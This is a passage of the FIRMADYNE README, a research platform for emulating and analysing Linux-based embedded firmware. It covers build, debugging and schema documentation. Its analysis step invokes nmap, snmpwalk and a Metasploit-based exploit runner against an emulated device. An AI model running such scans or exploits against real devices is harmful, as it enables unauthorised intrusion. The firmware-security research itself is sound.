   * `./scratch/1/run.sh`
9. The system should be available over the network, and is ready for analysis. Kernel messages are mirrored to `./scratch/1/qemu.final.serial.log`. The filesystem for firmware `1` can be mounted to and unmounted from `scratch/1/image` with `./scripts/mount.sh 1` and `./scripts/umount.sh 1`.
   * `./analyses/snmpwalk.sh 192.168.0.100`
   * `./analyses/webAccess.py 1 192.168.0.100 log.txt`
   * `mkdir exploits; ./analyses/runExploits.py -t 192.168.0.100 -o exploits/exploit -e x` (requires Metasploit Framework)
   * `sudo nmap -O -sV 192.168.0.100`
10. The default console should be automatically connected to the terminal. You may also login with `root` and `password`. Note that `Ctrl-c` is sent to the guest; use the QEMU monitor command `Ctrl-a + x` to terminate emulation.

# FAQ

## `run.sh` is not generated

This is a common error that is encountered when the network configuration is unable to be inferred. Follow the checklist below to figure out the cause.

1. `inferNetwork.sh`: Did this script find any network interfaces (e.g. `Interfaces: [br0, 192.168.0.1]`)? If so, this is a bug; please report it. Otherwise, continue below.
2. `qemu.initial.serial.log`: Does this file end with `Unable to mount root fs on unknown-block(8,1)`? If so, the initial filesystem image was not generated correctly using `kpartx`. Try deleting the scratch directory corresponding to this firmware image, and restart at `makeImage.sh`. Otherwise, the initial emulation didn't produce any useful instrumentation. Try increasing the timeout in `inferNetwork.sh` from `60` to `120` and restarting at `inferNetwork.sh`.
3. `qemu.initial.serial.log`: Did the `init` process crash, and is this preceded by a failed NVRAM operation (e.g. `nvram_get_buf: Unable to open key <foo>`)? If so, see the FAQ entries below.

## Log ends with "Kernel panic - not syncing: No working init found"

The firmware uses an initialization process with an unusual name. You'll need to manually inspect the filesystem to identify the correct one, then modify the script to specify its full path by appending a kernel boot parameter `init=<path>` to QEMU.

## A process crashed, e.g. `do_page_fault() #2: sending SIGSEGV for invalid read access from 00000000`

It is likely that the process requested a NVRAM entry that FIRMADYNE does not have a default value for. This can be fixed by manually adding a source for NVRAM entries to `NVRAM_DEFAULTS_PATH`, an entry to `NVRAM_DEFAULTS`, or a file to `OVERRIDE_POINT` in `libnvram`. For more details, see the [documentation for libnvram](https://github.com/firmadyne/libnvram). Note that the first two options involve modifying `config.h`, which will require recompilation of `libnvram`.

## How do I debug the emulated firmware?

1. With full-system QEMU emulation, compile a statically-linked `gdbserver` for the target architecture, copy it into the filesystem, attach it to the process of interest, and connect remotely using `gdb-multiarch`. You'll need a cross-compile toolchain; either use the `crossbuild-essential-*` packages supplied by Debian/Ubuntu, build it from scratch using e.g. `buildroot`, or look for GPL sources and/or pre-compiled binaries online. If you have IDA Pro, you can use IDA's pre-compiled debug servers (located in the `dbgsrv` subdirectory of the install), though they are not GDB-compatible.
2. With full-system QEMU emulation, pass the `-s -S` parameters to QEMU and connect to the stub using `target remote localhost:1234` from `gdb-multiarch`. However, the debugger won't automatically know where kernel and userspace is in memory, so you may need to manually do `add-symbol-file` in `gdb` and break around `try_to_run_init_process()` in the kernel.
3. With user-mode QEMU emulation, `chroot` into the firmware image (optional), set `LD_LIBRARY_PATH` to contain the FIRMADYNE libnvram, and pass both the `-L` parameter with the correct path to the firmware `/lib` directory, and the binary of interest to QEMU. This is easiest to debug, because you can attach directly to the process using `gdb-multiarch`, and interact directly with the process, but the system state may not be accurate since the host kernel is being used. It is also somewhat insecure, because the emulated firmware can access the host filesystem and interact with the host kernel.

# Compiling from Source

If you would like to compile the entire FIRMADYNE system from scratch
without using our pre-built binaries, please follow the steps below.

## [Toolchain](https://github.com/GregorR/musl-cross)

In order to build any of the binaries used by FIRMADYNE, you will need three
cross-compilation toolchains for the following architecture triples. Use only
[musl libc](http://www.musl-libc.org) as the C runtime library for the
toolchain; others have not been tested.

* arm-linux-musleabi
* mipseb-linux-musl
* mipsel-linux-musl

To simplify the process of building cross-compilation toolchains with musl, we
recommend using the [musl-cross](https://github.com/GregorR/musl-cross) project.
Follow the below steps to build these toolchains from source, or alternatively
click [here](https://zenodo.org/record/4922202) to
download our pre-built toolchains.

1. `git clone https://github.com/GregorR/musl-cross.git`
2. Modify or set the following variables in `defs.sh`

   * `BINUTILS_URL=http://ftp.gnu.org/gnu/binutils/binutils-2.25.1.tar.bz2`
   * `GCC_VERSION=5.3.0`
   * `GMP_VERSION=6.0.0a`
   * `MPC_VERSION=1.0.2`
   * `MPFR_VERSION=3.1.3`
   * `LIBELF_VERSION=master`
   * `MUSL_DEFAULT_VERSION=1.1.12`
   * `MUSL_GIT_VERSION=615629bd6fcd6ddb69ad762e679f088c7bd878e2`
   * `LANG_CXX=no`
   * `GCC_BUILTIN_PREREQS=yes`
3. Modify or set the following variables in `config.sh`

   * `CFLAGS="-fPIC"`
4. For little-endian MIPS, perform the following:

   * set `TRIPLE=mipsel-linux-musl` in `config.sh`
   * set `LINUX_HEADERS_URL=https://mirrors.edge.kernel.org/pub/linux/kernel/v2.6/linux-2.6.39.4.tar.xz` in `defs.sh`
   * run `./clean.sh` to clean out any previous builds
   * run `./build.sh` to build and install the toolchain into `/opt/cross`
5. For big-endian MIPS, perform the following:

   * set `TRIPLE=mipseb-linux-musl` in `config.sh`
   * set `LINUX_HEADERS_URL=https://mirrors.edge.kernel.org/pub/linux/kernel/v2.6/linux-2.6.39.4.tar.xz` in `defs.sh`
   * run `./clean.sh` to clean out any previous builds
   * run `./build.sh` to build and install the toolchain into `/opt/cross`
6. For little-endian ARM, perform the following:

   * set `TRIPLE=arm-linux-musleabi`, `GCC_BOOTSTRAP_CONFFLAGS="--with-arch=armv6 --with-float=softfp"`, and `GCC_CONFFLAGS="--with-arch=armv6 --with-float=softfp"` in `config.sh`
   * set `LINUX_HEADERS_URL=https://kernel.org/pub/linux/kernel/v4.x/linux-4.1.17.tar.xz` in `defs.sh`
   * run `./clean.sh` to clean out any previous builds
   * run `./build.sh` to build and install the toolchain into `/opt/cross`
7. You should have the following directories, or wherever you installed the toolchains:

   * `/opt/cross/arm-linux-musleabi`
   * `/opt/cross/mipseb-linux-musl`
   * `/opt/cross/mipsel-linux-musl`

## [console](https://github.com/firmadyne/console)

1. `cd ./firmadyne/sources/console`
2. `make clean && CC=/opt/cross/arm-linux-musleabi/bin/arm-linux-musleabi-gcc make && mv console ../../binaries/console.armel`
3. `make clean && CC=/opt/cross/mipseb-linux-musl/bin/mipseb-linux-musl-gcc make && mv console ../../binaries/console.mipseb`
4. `make clean && CC=/opt/cross/mipsel-linux-musl/bin/mipsel-linux-musl-gcc make && mv console ../../binaries/console.mipsel`

## [libnvram](https://github.com/firmadyne/libnvram)

1. `cd ./firmadyne/sources/libnvram`
2. `make clean && CC=/opt/cross/arm-linux-musleabi/bin/arm-linux-musleabi-gcc make && mv libnvram.so ../../binaries/libnvram.so.armel`
3. `make clean && CC=/opt/cross/mipseb-linux-musl/bin/mipseb-linux-musl-gcc make && mv libnvram.so ../../binaries/libnvram.so.mipseb`
4. `make clean && CC=/opt/cross/mipsel-linux-musl/bin/mipsel-linux-musl-gcc make && mv libnvram.so ../../binaries/libnvram.so.mipsel`

## Kernel

### [ARM](https://github.com/firmadyne/kernel-v4.1)

1. `git clone https://github.com/firmadyne/kernel-v4.1.git && cd kernel-v4.1`
2. `mkdir -p build/armel`
3. `cp config.armel build/armel/.config`
4. `make ARCH=arm CROSS_COMPILE=/opt/cross/arm-linux-musleabi/bin/arm-linux-musleabi- O=./build/armel zImage -j8`
5. `cp build/armel/arch/arm/boot/zImage ../firmadyne/binaries/zImage.armel`

### [MIPS](https://github.com/firmadyne/kernel-v2.6)

1. `git clone https://github.com/firmadyne/kernel-v2.6.git && cd kernel-v2.6`
2. For big-endian MIPS, perform the following:

   1. `mkdir -p build/mipseb`
   2. `cp config.mipseb build/mipseb/.config`
   3. `make ARCH=mips CROSS_COMPILE=/opt/cross/mipseb-linux-musl/bin/mipseb-linux-musl- O=./build/mipseb -j8`
   4. `cp build/mipseb/vmlinux ../firmadyne/binaries/vmlinux.mipseb`
3. For little-endian MIPS, perform the following:

   1. `mkdir -p build/mipsel`
   2. `cp config.mipsel build/mipsel/.config`
   3. `make ARCH=mips CROSS_COMPILE=/opt/cross/mipsel-linux-musl/bin/mipsel-linux-musl- O=./build/mipsel -j8`
   4. `cp build/mipsel/vmlinux ../firmadyne/binaries/vmlinux.mipsel`

# Database

During development, the database was stored on a PostgreSQL server.

## Data

Although we cannot redistribute binary firmware, the data used for our
experiments is available [here](https://zenodo.org/record/4922202).

## [Schema](https://github.com/firmadyne/firmadyne/blob/master/database/schema)

Below are descriptions of tables in the schema.

* `brand`: Stores brand names for each vendor.

| Column | Description |
| --- | --- |
| id | Primary key |
| name | Brand name |

* `image`: Stores information about each firmware image.

| Column | Description |
| --- | --- |
| id | Primary key |
| filename | File name |
| brand\_id | Foreign key to `brand` |
| hash | MD5 |
| rootfs\_extracted | Whether the primary filesystem was extracted |
| kernel\_extracted | Whether the kernel was extracted |
| arch | Hardware architecture |
| kernel\_version | Version of the extracted kernel |

* `object`: Stores information about each file in a filesystem.

| Column | Description |
| --- | --- |
| id | Primary key |
| hash | MD5 |

* `object_to_image`: Maps unique files to their firmware images.

| Column | Description |
| --- | --- |
| id | Primary key |
| oid | Foreign key to `object` |
| iid | Foreign key to `image` |
| filename | Full path to the file |
| regular\_file | Whether the file is regular |
| permissions | File permissions in octal |
| uid | Owner's user ID |
| gid | Group's group ID |

* `product`

| Column | Description |
| --- | --- |
| id | Primary key |
| iid | Foreign key to `image` |
| url | Download URL |
| mib\_filename | Filename of the SNMP MIB |
| mib\_hash | MD5 of the SNP MIB |
| mib\_url | Download URL of the SNMP MIB |
| sdk\_filename | Filename of the source SDK |
| sdk\_hash | MD5 of the source SDK |
| sdk\_url | Download URL of the source SDK |
| product | Product name |
| version | Version string |
| build | Build string |
| date | Release date |

# Paper

The results discussed in our [paper](https://github.com/firmadyne/firmadyne/blob/master/paper/paper.pdf) were produced using pre-release versions of the following:

* toolchains:
  + `BINUTILS_URL=http://ftp.gnu.org/gnu/binutils/binutils-2.25.1.tar.bz2`, `GCC_VERSION=4.9.3`, `GMP_VERSION=6.0.0a`, `MPC_VERSION=1.0.2`, `MPFR_VERSION=3.1.3`, `LIBELF_VERSION=71bf774909fd654d8167a475333fa8f37fbbcb5d`, `MUSL_DEFAULT_VERSION=1.1.10`, `MUSL_GIT_VERSION=996d148bf14b477b07fa3691bffeb930c67b2b62`, `LANG_CXX=no`
  + ARM: `LINUX_HEADERS_URL=https://kernel.org/pub/linux/kernel/v3.x/linux-3.10.84.tar.xz`
  + MIPS: `LINUX_HEADERS_URL=https://kernel.org/pub/linux/kernel/v2.6/longterm/v2.6.32/linux-2.6.32.67.tar.xz`
* kernels:
  + ARM: [firmadyne-v3.10.92](https://github.com/firmadyne/kernel-v3.10/tree/firmadyne-v3.10.92)
  + MIPS: [firmadyne-v2.6.32.68](https://github.com/firmadyne/kernel-v2.6.32/tree/firmadyne-v2.6.32.68) without `e2b9f315547ea50a65baad4899a4780078ab273e` and `26bb3636c987fc7e145af73ddea6c10fa93bdae9`
* console: [`c36ae8553fa4e9c82e8a65752906641d81c2360c`](https://github.com/firmadyne/console/commits/c36ae8553fa4e9c82e8a65752906641d81c2360c)
* extractor: [`5520c64bfa8554c5c17ab671aaed0fdeec91bf19`](https://github.com/firmadyne/extractor/commits/5520c64bfa8554c5c17ab671aaed0fdeec91bf19)
* libnvram: [`b60e7d4d576b39dd46107058adb635d43e80e00d`](https://github.com/firmadyne/libnvram/commits/b60e7d4d576b39dd46107058adb635d43e80e00d)
* qemu-linaro: [`4753f5e8126a00cc0a8559bfd9b47d6340903323`](https://github.com/firmadyne/qemu-linaro/commits/4753f5e8126a00cc0a8559bfd9b47d6340903323)
* binwalk: [`f2ce2992695fae5477c46980148c89e9c91a5cce`](https://github.com/ReFirmLabs/binwalk/commits/f2ce2992695fae5477c46980148c89e9c91a5cce)
  + jefferson: [`090a33be0be4aac8eee8d825447c0eb18dc8b51a`](https://github.com/firmadyne/jefferson/commits/090a33be0be4aac8eee8d825447c0eb18dc8b51a)
  + sasquatch: [`287e4a8e059d3ee7a5f643211fcf00c292cd6f4d`](https://github.com/firmadyne/sasquatch/commits/287e4a8e059d3ee7a5f643211fcf00c292cd6f4d)

## About

Platform for emulation and dynamic analysis of Linux-based firmware

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/firmadyne/firmadyne/activity)
[Custom properties](/firmadyne/firmadyne/custom-properties)
### Stars

[**1.9k**
stars](/firmadyne/firmadyne/stargazers)
### Watchers

[**73**
watching](/firmadyne/firmadyne/watchers)
### Forks

[**349**
forks](/firmadyne/firmadyne/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Ffirmadyne%2Ffirmadyne&report=firmadyne+%28user%29)

## [Releases](/firmadyne/firmadyne/releases)

No releases published

## [Packages 0](/orgs/firmadyne/packages?repo_name=firmadyne)

No packages published

## [Contributors 22](/firmadyne/firmadyne/graphs/contributors)

* [![@ddcc](https://avatars.githubusercontent.com/u/1108560?s=64&v=4)](https://github.com/ddcc)
* [![@kyechou](https://avatars.githubusercontent.com/u/11006026?s=64&v=4)](https://github.com/kyechou)
* [![@brianpow](https://avatars.githubusercontent.com/u/647087?s=64&v=4)](https://github.com/brianpow)
* [![@mborgerson](https://avatars.githubusercontent.com/u/8210?s=64&v=4)](https://github.com/mborgerson)
* [![@BoLaMN](https://avatars.githubusercontent.com/u/414479?s=64&v=4)](https://github.com/BoLaMN)
* [![@FlUxIuS](https://avatars.githubusercontent.com/u/715195?s=64&v=4)](https://github.com/FlUxIuS)
* [![@xiaohuajiao](https://avatars.githubusercontent.com/u/3733728?s=64&v=4)](https://github.com/xiaohuajiao)
* [![@dfbravo](https://avatars.githubusercontent.com/u/7070913?s=64&v=4)](https://github.com/dfbravo)
* [![@c0mix](https://avatars.githubusercontent.com/u/7628179?s=64&v=4)](https://github.com/c0mix)
* [![@asutoshpalai](https://avatars.githubusercontent.com/u/8471682?s=64&v=4)](https://github.com/asutoshpalai)
* [![@zi0Black](https://avatars.githubusercontent.com/u/13380579?s=64&v=4)](https://github.com/zi0Black)
* [![@reteps](https://avatars.githubusercontent.com/u/13869303?s=64&v=4)](https://github.com/reteps)
* [![@canance](https://avatars.githubusercontent.com/u/14318951?s=64&v=4)](https://github.com/canance)
* [![@firmianay](https://avatars.githubusercontent.com/u/15265215?s=64&v=4)](https://github.com/firmianay)

[+ 8 contributors](/firmadyne/firmadyne/graphs/contributors)

## Languages

* [Shell
  49.7%](/firmadyne/firmadyne/search?l=shell)
* [Python
  41.7%](/firmadyne/firmadyne/search?l=python)
* [Ruby
  5.5%](/firmadyne/firmadyne/search?l=ruby)
* [Dockerfile
  3.1%](/firmadyne/firmadyne/search?l=dockerfile)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


